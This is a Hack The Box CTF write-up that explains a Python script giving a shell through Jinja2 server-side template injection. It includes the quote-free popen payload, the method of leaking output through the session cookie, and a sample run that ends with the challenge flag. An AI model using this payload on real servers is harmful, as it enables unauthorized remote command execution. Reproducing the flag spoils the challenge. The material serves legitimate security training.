# Hack The Box. Challenges. Web. baby ninja jinja

Challenge write-up: https://7rocky.github.io/en/ctf/htb-challenges/web/baby-ninja-jinja

### `ssti.py`

This script is made to obtain a limited interactive shell over Server-Side Template Injection (SSTI).

The challenge provides a way to enter an SSTI payload on Jinja2 without using `{{` or quotes (`"`, `'`). Hence, we must use `{% ... %}` blocks and use additional URL query parameters for strings.

The payload is not reflected in the HTTP response. The way we can exfiltrate information in this situation is adding the output of our commands to the session dictionary.

Having said that, this is the principal function of the script:

```python
def exec_cmd(host: str, cmd: str):
    params = {
        'name': '{% if session.update({request.args.c: cycler.__init__.__globals__.os.popen(request.args.cmd).read().decode()}) == 1 %}{% endif %}',
        'c': 'c',
        'cmd': cmd
    }

    res = requests.get(f'http://{host}', params)

    set_cookie = res.headers['Set-Cookie']
    session = re.findall(r'session=(.*?)\.', set_cookie)[0]

    try:
        content = json.loads(b64d(pad_b64(session)).decode())
        print(content['c'])
    except json.JSONDecodeError:
        print('Could not decode\n')
```

First, we see the SSTI payload, which updates the session dictionary and adds a key `c` (it comes from another URL query parameter). Then, it executes a system command with a common SSTI payload on Jinja2 (the command `cmd` comes from yet another URL query parameter).

When receiving the response, we take the cookie and extract the session object, which has our exfiltrated data encoded in Base64.

In order to avoid Base64 decoding errors, we must add a valid padding to the received data:

```python
def pad_b64(string: str) -> str:
    return string + '=' * (-len(string) % 4)
```

After that, we only extract the content we want and print it out.

The `main` function keeps asking for more commands to mimic a shell session:

```python
def main():
    hostname = sys.argv[1]

    while True:
        try:
            exec_cmd(hostname, input('$ '))
        except KeyboardInterrupt:
            exit()
```

This is an example of execution:

```console
$ python3 ssti.py 157.245.33.77:31650
$ whoami
nobody

$ ls
app.py
flag_P54ed
schema.sql
static
templates

$ cat flag_P54ed
HTB{b4by_ninj4s_d0nt_g3t_qu0t3d_0r_c4ughT}  
```
